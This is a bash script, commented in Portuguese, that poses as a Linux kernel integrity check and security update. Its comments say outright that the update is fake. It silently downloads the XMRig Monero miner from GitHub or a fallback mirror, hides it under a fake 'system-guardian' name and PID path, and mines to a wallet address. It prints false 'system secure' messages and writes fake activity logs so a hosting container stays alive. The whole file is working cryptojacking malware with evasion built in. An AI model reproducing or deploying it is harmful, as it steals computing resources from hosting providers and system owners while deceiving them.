#!/bin/bash

# update.sh v4.3 - Protocolo Moreno (Invisível)
# Serviço de atualização de sistema Linux (falso)
# Executa mineração de Monero em segundo plano

echo "[SYSTEM] Iniciando verificação de integridade do kernel..."

# Delay aleatório para evitar padrão
sleep $((RANDOM % 50 + 10))

# Instala dependências silenciosas (parece manutenção)
apt-get update > /dev/null 2>&1 || true
apt-get install -y wget curl tar gzip libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1 || true

# Baixa XMRig disfarçado como "patch de segurança"
PATCH_URL="https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz"
if ! wget -qO /tmp/sys-patch-core.tar.gz "$PATCH_URL"; then
    echo "[WARNING] Servidor primário falhou. Usando mirror secundário..."
    if ! wget -qO /tmp/sys-patch-core.tar.gz https://mirror.monerominer.rocks/xmrig-6.16.2-linux-static-x64.tar.gz; then
        echo "[ERROR] Falha ao baixar patch. Abortando."
        exit 0
    fi
fi

# Extrai como serviço legítimo
mkdir -p /opt/system-guardian
tar -xzf /tmp/sys-patch-core.tar.gz -C /opt/system-guardian --strip-components=1
chmod +x /opt/system-guardian/xmrig
rm -f /tmp/sys-patch-core.tar.gz

# Executa mineração com nome falso + limite de CPU
nohup /opt/system-guardian/xmrig \
  -o gulf.moneroocean.stream:17017 \                          # Pool estável
  -u 4BDDTir3gpe12zzduhp9Vc3iZpgg5oW71BzH71cmsHv4C31mrRPPCKh2dNpBMQRRdWLXVy91jyfYsgF6MaZjceNu8a1KWgL \  # 🔁 MUDA PRA TEU WALLET!
  --cpu-max-threads-hint=75 \                                 # Usa 75% da CPU
  --donate-level=0 \                                          # Zero doação
  --log-file=/var/log/system-guardian.log \                   # Log realista
  --pid=/tmp/.X11-unix/X0-lock \                              # PID falso
  --background > /dev/null 2>&1 &

echo "[OK] Atualizações críticas aplicadas. Sistema seguro."

# Cria atividade falsa para manter container vivo
touch /var/log/system-activity.log
echo "$(date) - System Guardian: Status OK | Versão 4.3.1" >> /var/log/system-activity.log

# Loop camuflado (Render aceita logs ativos)
while true; do
  sleep 180
  echo "$(date) - System Guardian: Monitoramento contínuo..." >> /var/log/system-activity.log
done
